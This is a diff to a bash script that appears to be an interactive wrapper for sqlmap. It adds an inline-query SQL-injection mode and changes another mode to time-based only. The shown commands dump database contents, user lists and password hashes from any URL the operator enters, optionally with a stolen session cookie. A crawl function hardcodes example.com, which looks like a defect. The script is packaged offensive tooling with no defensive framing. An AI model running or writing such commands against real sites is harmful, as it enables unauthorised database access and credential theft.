@@ -94,11 +94,27 @@ read -p "Level: " level5
 if [ "$cookiein5" -eq 1 ]
 then
 read -p "Cookie: " cookie5
-sqlmap -u "$url5" --cookie="$cookie5" --dump --users --passwords --risk=$risk5 --level=$level5 --technique=BEUSTQ  
+sqlmap -u "$url5" --cookie="$cookie5" --dump --users --passwords --risk=$risk5 --level=$level5 --technique=T  
 else
-sqlmap -u "$url5"  --dump --users --passwords --risk=$risk5 --level=$level5 --technique=BEUSTQ  
+sqlmap -u "$url5"  --dump --users --passwords --risk=$risk5 --level=$level5 --technique=T  
 fi
 }
+
+function inlineQuery() {
+printf "Inline Query Technique\n\n"
+read -p "Do you have a cookie?(y=1/n=0): " cookiein6
+read -p "Url: " url6
+read -p "Risk level: " risk6
+read -p "Level: " level6
+if [ "$cookiein6" -eq 1 ]
+then
+read -p "Cookie: " cookie6
+sqlmap -u "$url6" --cookie="$cookie6" --dbs --columns --tables --risk=$risk6 --level=$level6 --technique=Q
+else
+sqlmap -u "$url6"  --dbs --columns --tables --risk=$risk6 --level=$level6 --technique=Q
+fi
+} 
+
 
 function crawl() {
 printf "Crawl & Discovery \n\n"
@@ -115,6 +131,7 @@ else
 sqlmap -u http://example.com --forms --batch --crawl=$crawl7  --level=$level7 --risk=$risk7
 fi
 }
+
 function choices() {
 echo "
 -----------------------
@@ -153,7 +170,7 @@ stackedQuery
 timeBased
 ;;
 6)
-#Inline Queries
+inlineQuery
 ;;
 7)
 crawl
